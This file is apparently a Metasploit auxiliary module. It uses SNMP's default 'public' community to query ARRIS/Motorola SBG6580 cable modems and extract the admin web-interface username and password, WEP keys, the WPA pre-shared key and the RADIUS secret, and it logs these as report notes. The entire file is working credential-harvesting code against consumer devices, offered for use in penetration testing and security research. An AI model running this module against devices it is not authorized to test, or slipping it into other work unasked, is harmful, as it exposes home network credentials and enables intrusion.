##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module',
      'Description' => 'This module allows SNMP enumeration of the ARRIS / Motorola
        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports the username
        and password for the device user interface as well as wireless network keys
        and information.
        The default community used is "public".',
      'References'  =>
        [
          [ 'URL', 'https://seclists.org/fulldisclosure/2014/May/79' ],
          [ 'URL', 'http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf' ],
          [ 'OSVDB', '110555' ]
        ],
      'Author'      => 'Matthew Kienow <mkienow[at]inokii.com>',
      'License'     => MSF_LICENSE
    ))

    # change SNMP version option to match device specification
    register_options(
      [
        OptString.new('VERSION', [ true, 'SNMP Version <1/2c>', '2c' ])
      ])
  end

  def run_host(ip)

    begin
      snmp = connect_snmp

      # represents the order of the output data fields
      fields_order = [
        "Host IP", "Username", "Password", "SSID", "802.11 Band",
        "Network Authentication Mode", "WEP Passphrase", "WEP Encryption",
        "WEP Key 1", "WEP Key 2", "WEP Key 3", "WEP Key 4",
        "Current Network Key", "WPA Encryption", "WPA Pre-Shared Key (PSK)",
        "RADIUS Server", "RADIUS Port", "RADIUS Key"
      ]

      output_data = {"Host IP" => ip}

      sys_descr = snmp.get_value('sysDescr.0')
      if is_valid_snmp_value(sys_descr) and sys_descr.to_s =~ /SBG6580/
        # print connected status after the first query so if there are
        # any timeout or connectivity errors; the code would already
        # have jumped to error handling where the error status is
        # already being displayed.
        print_good("#{ip}, Connected.")

        # attempt to get the username and password for the device user interface
        # using the CableHome cabhPsDevMib MIB module which defines the
        # basic management objects for the Portal Services (PS) logical element
        # of a CableHome compliant Residential Gateway device
        device_ui_selection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0')
        if is_valid_snmp_value(device_ui_selection) and device_ui_selection.to_i == 1
          # manufacturerLocal(1) - indicates Portal Services is using the vendor
          # web user interface shipped with the device
          device_ui_username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')
          if is_valid_snmp_value(device_ui_username)
            output_data["Username"] = device_ui_username.to_s
          end

          device_ui_password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')
          if is_valid_snmp_value(device_ui_password)
            output_data["Password"] = device_ui_password.to_s
          end
        end

        wifi_ifindex = get_primary_wifi_ifindex(snmp)
        if wifi_ifindex < 1
          print_status("Primary WiFi is disabled on the device")
        end

        ssid = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.#{wifi_ifindex}")
        if is_valid_snmp_value(ssid)
          output_data["SSID"] = ssid.to_s
        end

        wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0')
        if is_valid_snmp_value(wireless_band)
          output_data["802.11 Band"] = get_wireless_band_name(wireless_band.to_i)
        end

        network_auth_mode = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.#{wifi_ifindex}")
        if is_valid_snmp_value(network_auth_mode)
          network_auth_mode = network_auth_mode.to_i
          network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)
          output_data["Network Authentication Mode"] = network_auth_mode_name
        end

        case network_auth_mode
        when 1, 6
          # WEP, WEP 802.1x Authentication
          wep_passphrase = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.#{wifi_ifindex}")
          if is_valid_snmp_value(wep_passphrase)
            output_data["WEP Passphrase"] = wep_passphrase.to_s
          end

          wep_encryption = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.#{wifi_ifindex}")
          if is_valid_snmp_value(wep_encryption)
            wep_encryption = wep_encryption.to_i
          else
            wep_encryption = -1
          end

          wep_encryption_name = "Unknown"
          wep_key1 = wep_key2 = wep_key3 = wep_key4 = nil
          # get appropriate WEP keys based on wep_encryption setting
          if wep_encryption == 1
            wep_encryption_name = "64-bit"
            wep_key1 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.1")
            wep_key2 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.2")
            wep_key3 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.3")
            wep_key4 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.#{wifi_ifindex}.4")
          elsif wep_encryption == 2
            wep_encryption_name = "128-bit"
            wep_key1 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.1")
            wep_key2 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.2")
            wep_key3 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.3")
            wep_key4 = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.#{wifi_ifindex}.4")
          end

          output_data["WEP Encryption"] = wep_encryption_name
          if is_valid_snmp_value(wep_key1)
            output_data["WEP Key 1"] = wep_key1.unpack('H*')[0]
          end
          if is_valid_snmp_value(wep_key2)
            output_data["WEP Key 2"] = wep_key2.unpack('H*')[0]
          end
          if is_valid_snmp_value(wep_key3)
            output_data["WEP Key 3"] = wep_key3.unpack('H*')[0]
          end
          if is_valid_snmp_value(wep_key4)
            output_data["WEP Key 4"] = wep_key4.unpack('H*')[0]
          end

          # get current network key
          current_key = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.#{wifi_ifindex}")
          if is_valid_snmp_value(current_key)
            output_data["Current Network Key"] = current_key.to_s
          end

          if network_auth_mode == 6
            get_radius_info(snmp, wifi_ifindex, output_data)
          end

        when 2, 3, 4, 5, 7, 8
          # process all flavors of WPA
          wpa_encryption = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.#{wifi_ifindex}")
          if is_valid_snmp_value(wpa_encryption)
            output_data["WPA Encryption"] = get_wpa_encryption_name(wpa_encryption.to_i)
          end

          wpa_psk = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.#{wifi_ifindex}")
          if is_valid_snmp_value(wpa_psk)
            output_data["WPA Pre-Shared Key (PSK)"] = wpa_psk.to_s
          end

          case network_auth_mode
          when 4, 5, 8
            get_radius_info(snmp, wifi_ifindex, output_data)
          end
        end

        # output
        print_line("")
        print_status("Device information:\n")
        line = ""
        width = 30  # name field width

        fields_order.each {|k|
          if not output_data.has_key?(k)
            next
          end

          v = output_data[k]
          if (v.nil? or v.empty? or v =~ /Null/)
            v = '-'
          end

          report_note(
            :host  => ip,
            :proto => 'udp',
            :sname => 'snmp',
            :port  => datastore['RPORT'].to_i,
            :type  => "snmp.#{k}",
            :data  => v
          )

          line << sprintf("%s%s: %s\n", k, " "*([0,width-k.length].max), v)
        }

        print_line(line)
      else
        print_error("#{ip} does not appear to be a SBG6580.")
      end

    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::InvalidIpAddress
      print_error("#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
      elog("Unknown error: #{e.class} #{e}")
      elog("Call stack:\n#{e.backtrace.join "\n"}")
    ensure
      disconnect_snmp
    end
  end

  def get_primary_wifi_ifindex(snmp)
    # The ifTable contains interface entries where each row represents
    # management information for a particular interface. Locate the first
    # interface where ifType is 71 (ieee80211) and ifAdminStatus is 1 (up).
    wifi_ifindex = 0
    ifTable_columns = ["ifIndex", "ifDescr", "ifType", "ifAdminStatus"]
    snmp.walk(ifTable_columns) do |ifIndex, ifDescr, ifType, ifAdminStatus|
      if (wifi_ifindex < 1 and ifType.value == 71 and ifAdminStatus.value == 1)
        wifi_ifindex = ifIndex.value.to_i
      end
    end
    wifi_ifindex
  end

  def is_valid_snmp_value(value)
    if value.nil? or value.to_s =~ /Null/ or value.to_s =~ /^noSuch/
      return false
    end
    return true
  end

  def get_network_auth_mode_name(network_auth_mode)
    case network_auth_mode
    when 0
      "Open Security"
    when 1
      "WEP"
    when 2
      "WPA-PSK"
    when 3
      "WPA2-PSK"
    when 4
      "WPA RADIUS"
    when 5
      "WPA2 RADIUS"
    when 6
      "WEP 802.1x Authentication"
    when 7
      "WPA-PSK and WPA2-PSK"
    when 8
      "WPA and WPA2 RADIUS"
    else
      "Unknown"
    end
  end

  def get_wireless_band_name(wireless_band)
    case wireless_band
    when 1
      "2.4 Ghz"
    when 2
      "5 Ghz"
    else
      "Unknown"
    end
  end

  def get_wpa_encryption_name(wpa_encryption)
    case wpa_encryption
    when 2
      "AES"
    when 3
      "TKIP+AES"
    else
      "Unknown"
    end
  end

  def get_radius_info(snmp, wifi_ifindex, output_data)
    radius_server = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.#{wifi_ifindex}")
    if is_valid_snmp_value(radius_server)
      output_data["RADIUS Server"] = radius_server.unpack("C4").join(".")
    end

    radius_port = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.3.#{wifi_ifindex}")
    if is_valid_snmp_value(radius_port)
      output_data["RADIUS Port"] = radius_port.to_s.strip
    end

    radius_key = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.#{wifi_ifindex}")
    if is_valid_snmp_value(radius_key)
      output_data["RADIUS Key"] = radius_key.to_s
    end
  end
end
